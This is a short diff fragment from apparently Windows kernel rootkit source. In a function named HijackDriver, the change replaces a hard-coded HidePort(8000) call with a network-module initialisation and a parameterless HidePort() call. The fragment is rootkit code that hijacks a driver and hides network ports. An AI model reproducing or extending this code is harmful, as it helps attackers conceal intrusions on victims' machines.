@@ -94,7 +94,8 @@ extern "C" NTSTATUS HijackDriver(_In_ struct _DRIVER_OBJECT* driver)
 #if DEBUG
     DbgPrint("Successfully hooked %wZ @ 0x%p\n", &driver->DriverName, driver);
 #endif
-    Rootkit::NetHook::HidePort(8000);
+    Rootkit::NetHook::Net.Init();
+    Rootkit::NetHook::HidePort();
 
     return STATUS_SUCCESS;
 }
